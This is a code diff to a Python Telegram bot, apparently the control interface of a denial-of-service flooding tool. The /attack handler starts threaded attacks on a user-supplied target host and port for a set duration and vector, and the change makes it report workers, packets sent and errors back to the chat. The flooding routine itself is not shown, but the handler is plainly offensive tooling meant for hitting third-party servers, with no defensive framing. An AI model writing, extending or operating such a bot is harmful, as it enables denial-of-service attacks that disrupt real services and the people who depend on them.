@@ -504,17 +504,30 @@ def handle_attack(message):
     def _run():
         t0 = datetime.datetime.now()
         try:
-            n = attack(target, port, duration, threads=threads,
-                       payload_size=config.PAYLOAD_SIZE, vector=vector)
-            elapsed = (datetime.datetime.now() - t0).total_seconds()
-            bot.send_message(
-                message.chat.id,
-                f"✅ Attack complete\n"
-                f"Target:   {target}:{port}\n"
-                f"Vector:   {vector.upper()}\n"
-                f"Workers:  {n}/{threads}\n"
-                f"Duration: {elapsed:.1f}s",
+            r = attack(
+                target,
+                port,
+                duration,
+                threads=threads,
+                payload_size=config.PAYLOAD_SIZE,
+                vector=vector,
             )
+            elapsed = (datetime.datetime.now() - t0).total_seconds()
+
+            lines = [
+                "✅ Attack complete",
+                f"Target:   {target}:{port}",
+                f"Vector:   {vector.upper()}",
+                f"Workers:  {r['workers']}/{threads}",
+                f"Sent:     {r['sent']}",
+                f"Errors:   {r['errors']}",
+                f"Duration: {elapsed:.1f}s",
+            ]
+            if r.get("last_error"):
+                lines.append(f"Last err: {r['last_error']}")
+
+            bot.send_message(message.chat.id, "\n".join(lines))
+
         except (ValueError, RuntimeError, OSError) as e:
             try:
                 bot.send_message(message.chat.id, f"❌ Attack error: {e}")
@@ -522,7 +535,6 @@ def handle_attack(message):
                 pass
 
     threading.Thread(target=_run, daemon=True).start()
-
 
 # ── /help ─────────────────────────────────────────────────────────────────
 
